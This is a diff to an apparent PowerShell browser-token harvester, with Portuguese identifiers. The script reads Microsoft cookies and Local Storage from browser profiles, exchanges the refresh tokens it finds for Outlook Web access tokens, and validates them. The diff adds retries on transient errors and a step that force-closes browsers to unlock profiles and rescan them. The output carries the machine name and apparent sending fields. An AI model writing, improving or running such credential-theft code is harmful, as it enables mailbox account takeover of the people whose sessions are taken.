@@ -377,37 +377,48 @@ function Test-MSCookies([string]$profileDir) {
 function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }
 
 $script:LastExchangeError = $null
+function Is-TransientExchangeError([string]$err) {
+    if (-not $err) { return $false }
+    if ($err -match "HTTP 429") { return $true }
+    if ($err -match "HTTP 5\d\d") { return $true }
+    if ($err -notmatch "HTTP \d+") { return $true }
+    return $false
+}
 function Exchange-OWATk([string]$rtk, [string]$client, [string]$scope) {
     $script:LastExchangeError = $null
     $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $rtk)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
-    try {
-        $req = [System.Net.HttpWebRequest]::Create($OWA_TK_URL)
-        $req.Method = "POST"
-        $req.ContentType = "application/x-www-form-urlencoded"
-        $req.Headers.Add("Origin", $OWA_ORIGIN)
-        $req.Timeout = 30000
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-        $rs = $req.GetRequestStream()
-        $rs.Write($bytes, 0, $bytes.Length)
-        $rs.Close()
-        $resp = $req.GetResponse()
-        $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
-        $content = $sr.ReadToEnd()
-        $resp.Close()
-        $j = $content | ConvertFrom-Json
-        return $j.access_token
-    } catch [System.Net.WebException] {
-        $code = 0; $errBody = ""
-        $hr = $_.Exception.Response
-        if ($hr) {
-            $code = [int]$hr.StatusCode
-            try { $sr = New-Object System.IO.StreamReader($hr.GetResponseStream()); $errBody = $sr.ReadToEnd(); $hr.Close() } catch {}
+    $tentativas = 0
+    while ($true) {
+        $tentativas++
+        try {
+            $req = [System.Net.HttpWebRequest]::Create($OWA_TK_URL)
+            $req.Method = "POST"
+            $req.ContentType = "application/x-www-form-urlencoded"
+            $req.Headers.Add("Origin", $OWA_ORIGIN)
+            $req.Timeout = 30000
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+            $rs = $req.GetRequestStream()
+            $rs.Write($bytes, 0, $bytes.Length)
+            $rs.Close()
+            $resp = $req.GetResponse()
+            $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
+            $content = $sr.ReadToEnd()
+            $resp.Close()
+            $j = $content | ConvertFrom-Json
+            return $j.access_token
+        } catch [System.Net.WebException] {
+            $code = 0; $errBody = ""
+            $hr = $_.Exception.Response
+            if ($hr) {
+                $code = [int]$hr.StatusCode
+                try { $sr = New-Object System.IO.StreamReader($hr.GetResponseStream()); $errBody = $sr.ReadToEnd(); $hr.Close() } catch {}
+            }
+            $script:LastExchangeError = "HTTP $code | $errBody"
+        } catch {
+            $script:LastExchangeError = $_.Exception.Message
         }
-        $script:LastExchangeError = "HTTP $code | $errBody"
-        return $null
-    } catch {
-        $script:LastExchangeError = $_.Exception.Message
-        return $null
+        if ($tentativas -ge 3 -or -not (Is-TransientExchangeError $script:LastExchangeError)) { return $null }
+        Start-Sleep -Milliseconds 1500
     }
 }
 
@@ -424,18 +435,23 @@ function Get-ExchangeErrorHint([string]$err) {
 }
 
 function Test-OWATk([string]$tk) {
-    try {
-        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
-        $j = $resp.Content | ConvertFrom-Json
-        $email = $j.EmailAddress
-        if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
-        return @{ state = "valido"; email = $email }
-    } catch {
-        $code = 0
-        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
-        if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
-        return @{ state = "erro"; email = $null }
+    for ($i = 0; $i -lt 2; $i++) {
+        try {
+            $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
+            $j = $resp.Content | ConvertFrom-Json
+            $email = $j.EmailAddress
+            if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
+            return @{ state = "valido"; email = $email }
+        } catch {
+            $code = 0
+            if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
+            if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
+            $transiente = ($code -eq 0) -or ($code -eq 429) -or ($code -ge 500)
+            if ($transiente -and $i -lt 1) { Start-Sleep -Milliseconds 1500; continue }
+            return @{ state = "erro"; email = $null }
+        }
     }
+    return @{ state = "erro"; email = $null }
 }
 
 function Get-OWAWriteTk([string]$rtk, [string]$client) {
@@ -863,6 +879,17 @@ function Close-Browsers {
     return $fechados
 }
 
+function Scan-AllProfiles([bool]$validate) {
+    $out = @()
+    foreach ($b in $browsers) {
+        $profiles = Get-Profiles $b.Root
+        foreach ($p in $profiles) {
+            $out += Analyze-Profile $b.Name $p.Name $p.Dir $validate
+        }
+    }
+    return $out
+}
+
 function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
     $cookies = Test-MSCookies $pdir
     $ldb = Join-Path $pdir "Local Storage\leveldb"
@@ -915,17 +942,21 @@ function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]
 $validate = -not $NoValidate.IsPresent
 $fechados = @()
 if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
-$results = @()
-foreach ($b in $browsers) {
-    $profiles = Get-Profiles $b.Root
-    foreach ($p in $profiles) {
-        $results += Analyze-Profile $b.Name $p.Name $p.Dir $validate
-    }
-}
+$results = @(Scan-AllProfiles $validate)
 
 $validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_VALIDO" })
 $vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
 $bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })
+
+$recuperacao = @()
+if (($validos.Count -eq 0) -and ($vivos.Count -eq 0) -and ($bloqueados.Count -gt 0) -and (-not $CloseBrowsers.IsPresent) -and (-not $DryRun.IsPresent)) {
+    $recuperacao += "tudo BLOQUEADO (navegador aberto) -> fechou navegadores e re-escaneou"
+    $fechados = @(Close-Browsers)
+    $results = @(Scan-AllProfiles $validate)
+    $validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_VALIDO" })
+    $vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
+    $bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })
+}
 
 if ($validos.Count -gt 0) {
     if ($validos.Count -gt 1) {
@@ -1117,6 +1148,7 @@ $out = [PSCustomObject]@{
     maquina   = $env:COMPUTERNAME
     timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
     navegadores_fechados = $fechados
+    recuperacao = $recuperacao
     decisao   = $decisao
     envio     = $envio
     envio_todos = $envioTodos
